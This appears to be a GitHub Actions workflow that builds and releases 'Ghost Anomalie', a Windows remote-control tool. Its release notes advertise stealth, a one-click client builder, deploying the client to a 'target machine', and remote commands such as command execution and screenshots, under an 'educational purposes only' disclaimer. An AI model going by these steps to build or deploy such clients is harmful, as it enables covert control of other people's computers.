name: Build Ghost Anomalie

on:
  push:
    tags:
      - 'v*'
  workflow_dispatch:

permissions:
  contents: write
  issues: write
  pull-requests: write

env:
  APP_NAME: GhostAnomalie
  VERSION: 1.3.0.3
  CONFIGURATION: Release

jobs:
  build:
    name: Build Windows Application
    runs-on: windows-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
      
      - name: Setup .NET
        uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '6.0.x'
      
      - name: Restore dependencies
        run: dotnet restore GhostAnomalie.sln
      
      - name: Build solution
        run: dotnet build GhostAnomalie.sln --configuration ${{ env.CONFIGURATION }} --no-restore
      
      - name: Publish application
        run: |
          dotnet publish src/GhostAnomalie.Server/GhostAnomalie.Server.csproj `
            --configuration ${{ env.CONFIGURATION }} `
            --output publish `
            --runtime win-x64 `
            --self-contained false `
            -p:DebugType=none `
            -p:DebugSymbols=false
      
      - name: Create ZIP package
        run: |
          mkdir release
          copy publish\GhostAnomalie.exe release\
          echo "Ghost Anomalie v${{ env.VERSION }}" > release/info.txt
          Compress-Archive -Path release\* -DestinationPath release\GhostAnomalie_${{ env.VERSION }}.zip
      
      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: GhostAnomalie
          path: release/
      
      - name: Create GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          files: |
            release/GhostAnomalie.exe
            release/GhostAnomalie_${{ env.VERSION }}.zip
          draft: false
          prerelease: false
          tag_name: ${{ github.ref_name }}
          name: Ghost Anomalie ${{ github.ref_name }}
          body: |
            # Ghost Anomalie ${{ github.ref_name }}
            
            > **WARNING: EDUCATIONAL PURPOSE ONLY - Use on your own devices or with explicit written consent.**
            
            ## What's New
            
            - Full Remote Control - Complete administration suite
            - Secure and Stealthy - Encrypted communication
            - Integrated Client Builder - Generate custom clients in one click
            - Dark Modern Interface - Professional hacker-style UI
            - Fast and Lightweight - Only 3-5 MB
            
            ## Download
            
            | File | Description |
            |------|-------------|
            | GhostAnomalie.exe | Controller application (Windows) |
            | GhostAnomalie_${{ env.VERSION }}.zip | Complete package |
            
            ## Quick Start
            
            1. Launch GhostAnomalie.exe
            2. Configure port and password
            3. Click START SERVER
            4. Go to Builder tab
            5. Configure server IP
            6. Click GENERATE CLIENT .EXE
            7. Deploy client to target machine
            8. Control from the server
            
            ## Commands Available
            
            | Command | Description |
            |---------|-------------|
            | screenshot | Capture remote screen |
            | sysinfo | Get system information |
            | cmd | Execute system command |
            | ls | List files |
            | shutdown | Shutdown PC |
            | restart | Restart PC |
            | lock | Lock workstation |
            | ping | Ping client |
            | exit | Disconnect |
            
            ## Legal Notice
            
            This tool is for EDUCATIONAL PURPOSES ONLY.
            
            By using this software, you agree to:
            - Use only on your own devices
            - Use for cybersecurity learning
            - NEVER use on devices without consent
            - NEVER use for illegal activities
            
            ---
            
            Made with love by Dev Messy from Gabon
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      
      - name: Build Complete
        run: |
          echo "Build completed successfully!"
          echo "EXE: release/GhostAnomalie.exe"
          echo "ZIP: release/GhostAnomalie_${{ env.VERSION }}.zip"
          echo "Release: https://github.com/${{ github.repository }}/releases/tag/${{ github.ref_name }}"
